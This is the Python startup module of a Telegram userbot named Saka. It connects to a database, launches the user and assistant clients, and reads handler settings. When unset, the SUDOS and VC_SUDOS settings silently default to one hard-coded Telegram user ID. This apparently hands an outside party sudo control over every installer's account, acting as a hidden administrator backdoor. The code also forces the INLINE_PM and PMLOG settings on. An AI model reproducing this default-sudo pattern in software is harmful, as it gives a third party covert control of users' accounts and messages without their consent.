# Saka - UserBot
# Copyright (C) 2021-2022 senpai80
#
# This file is a part of < https://github.com/senpai80/Saka/ >
# PLease read the GNU Affero General Public License in
# <https://www.github.com/senpai80/Saka/blob/main/LICENSE/>.

import os
import sys

from .version import __version__

run_as_module = False


class AyConfig:
    lang = "id"
    thumb = "resources/extras/logo.jpg"


if sys.argv[0] == "-m":
    run_as_module = True

    import time

    from .configs import Var
    from .startup import *
    from .startup._database import SakaDB
    from .startup.BaseClient import SakaClient
    from .startup.connections import validate_session, vc_connection
    from .startup.funcs import (_version_changes, autobot, enable_inline,
                                update_envs)
    from .version import saka_version

    if not os.path.exists("./modules"):
        LOGS.error(
            "'plugins' folder not found!\nMake sure that, you are on correct path."
        )
        exit()

    start_time = time.time()
    _saka_cache = {}
    _ignore_eval = []

    udB = SakaDB()
    update_envs()

    LOGS.info(f"Connecting to {udB.name}...")
    if udB.ping():
        LOGS.info(f"Connected to {udB.name} Successfully!")

    BOT_MODE = udB.get_key("BOTMODE")
    DUAL_MODE = udB.get_key("DUAL_MODE")

    if BOT_MODE:
        if DUAL_MODE:
            udB.del_key("DUAL_MODE")
            DUAL_MODE = False
        saka_bot = None

        if not udB.get_key("BOT_TOKEN"):
            LOGS.critical(
                '"BOT_TOKEN" not Found! Please add it, in order to use "BOTMODE"'
            )

            sys.exit()
    else:
        saka_bot = SakaClient(
            validate_session(Var.SESSION, LOGS),
            udB=udB,
            app_version=saka_version,
            device_model="Saka-Userbot",
        )
        saka_bot.run_in_loop(autobot())

    asst = SakaClient(None, bot_token=udB.get_key("BOT_TOKEN"), udB=udB)

    if BOT_MODE:
        saka_bot = asst
        if udB.get_key("OWNER_ID"):
            try:
                saka_bot.me = saka_bot.run_in_loop(
                    saka_bot.get_entity(udB.get_key("OWNER_ID"))
                )
            except Exception as er:
                LOGS.exception(er)
    elif not asst.me.bot_inline_placeholder:
        saka_bot.run_in_loop(enable_inline(saka_bot, asst.me.username))

    vcClient = vc_connection(udB, saka_bot)

    _version_changes(udB)

    HNDLR = udB.get_key("HNDLR") or "."
    SUDOS = udB.get_key("SUDOS") or "1054295664"
    VC_SUDOS = udB.get_key("VC_SUDOS") or "1054295664"
    DUAL_HNDLR = udB.get_key("DUAL_HNDLR") or "/"
    SUDO_HNDLR = udB.get_key("SUDO_HNDLR") or "$"
    INLINE_PM = udB.set_key("INLINE_PM", "True")
    PMLOG = udB.set_key("PMLOG", "True")
else:
    print("Saka-Userbot © @Rizzvbss")

    from logging import getLogger

    LOGS = getLogger("Saka-Userbot")

    saka_bot = asst = udB = vcClient = None
